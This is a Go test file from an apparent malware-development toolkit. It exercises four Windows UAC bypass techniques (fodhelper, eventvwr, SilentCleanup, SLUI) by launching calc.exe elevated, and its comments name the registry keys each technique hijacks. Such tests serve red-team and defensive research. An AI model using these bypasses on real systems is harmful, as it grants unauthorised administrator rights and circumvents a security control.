//go:build windows

package uacbypass

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows/registry"

	"github.com/oioio-space/maldev/testutil"
)

// requireUAC skips if UAC is disabled (EnableLUA=0).
func requireUAC(t *testing.T) {
	t.Helper()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, registry.QUERY_VALUE)
	if err != nil {
		return // can't check, proceed anyway
	}
	defer k.Close()
	val, _, err := k.GetIntegerValue("EnableLUA")
	if err == nil && val == 0 {
		t.Skip("UAC is disabled (EnableLUA=0) — bypass tests require UAC enabled")
	}
}

// TestFODHelper launches calc.exe via fodhelper UAC bypass.
//
// PREREQUISITES:
//   - Run as non-elevated user (standard user context)
//   - UAC must be enabled (default setting)
//   - Run in a VM
//   - Windows 10 or later
//
// USAGE:
//
//	MALDEV_MANUAL=1 go test ./uacbypass/ -run TestFODHelper -v
//
// VERIFY:
//
//	calc.exe should appear as an elevated process.
//	Check: tasklist /FI "IMAGENAME eq calc.exe" /V — should show High or System integrity.
//
// CLEANUP:
//
//	taskkill /F /IM calc.exe
//	Registry keys are cleaned up automatically by FODHelper's defer blocks.
func TestFODHelper(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)

	err := FODHelper("calc.exe")
	require.NoError(t, err)

	// Give the spawned process time to appear.
	time.Sleep(2 * time.Second)
	t.Log("check for elevated calc.exe process: tasklist /FI \"IMAGENAME eq calc.exe\" /V")
}

// TestEventVwr launches calc.exe via eventvwr UAC bypass.
//
// PREREQUISITES:
//   - Run as non-elevated user (standard user context)
//   - UAC must be enabled (default setting)
//   - Run in a VM
//   - Windows 10 or later
//
// USAGE:
//
//	MALDEV_MANUAL=1 go test ./uacbypass/ -run TestEventVwr -v
//
// VERIFY:
//
//	calc.exe should appear as an elevated process.
//	Check: tasklist /FI "IMAGENAME eq calc.exe" /V — should show High or System integrity.
//
// CLEANUP:
//
//	taskkill /F /IM calc.exe
//	Registry key HKCU\Software\Classes\mscfile\shell\open\command is cleaned by defer.
func TestEventVwr(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)

	err := EventVwr("calc.exe")
	require.NoError(t, err)

	// EventVwr internally sleeps 2s before spawning; add buffer for process visibility.
	time.Sleep(2 * time.Second)
	t.Log("check for elevated calc.exe process: tasklist /FI \"IMAGENAME eq calc.exe\" /V")
}

// TestSilentCleanup launches calc.exe via SilentCleanup scheduled task UAC bypass.
//
// PREREQUISITES:
//   - Run as non-elevated user (standard user context)
//   - UAC must be enabled (default setting)
//   - Run in a VM
//   - Windows 10 or later (SilentCleanup task must be present)
//
// USAGE:
//
//	MALDEV_MANUAL=1 go test ./uacbypass/ -run TestSilentCleanup -v
//
// VERIFY:
//
//	calc.exe should appear as an elevated process.
//	Check: tasklist /FI "IMAGENAME eq calc.exe" /V — should show High or System integrity.
//
// CLEANUP:
//
//	taskkill /F /IM calc.exe
//	HKCU\Environment\windir value is restored by defer DeleteValue.
func TestSilentCleanup(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)

	err := SilentCleanup("calc.exe")
	require.NoError(t, err)

	// SilentCleanup internally sleeps 1s; add buffer for process visibility.
	time.Sleep(2 * time.Second)
	t.Log("check for elevated calc.exe process: tasklist /FI \"IMAGENAME eq calc.exe\" /V")
}

// TestSLUI launches calc.exe via SLUI UAC bypass.
//
// PREREQUISITES:
//   - Run as non-elevated user (standard user context)
//   - UAC must be enabled (default setting)
//   - Run in a VM
//   - Windows 10 or later
//
// USAGE:
//
//	MALDEV_MANUAL=1 go test ./uacbypass/ -run TestSLUI -v
//
// VERIFY:
//
//	calc.exe should appear as an elevated process.
//	Check: tasklist /FI "IMAGENAME eq calc.exe" /V — should show High or System integrity.
//
// CLEANUP:
//
//	taskkill /F /IM calc.exe
//	Registry key HKCU\Software\Classes\exefile\shell\open\command is cleaned by defer.
func TestSLUI(t *testing.T) {
	testutil.RequireManual(t)
	requireUAC(t)

	err := SLUI("calc.exe")
	require.NoError(t, err)

	// SLUI internally sleeps 1s; add buffer for process visibility.
	time.Sleep(2 * time.Second)
	t.Log("check for elevated calc.exe process: tasklist /FI \"IMAGENAME eq calc.exe\" /V")
}
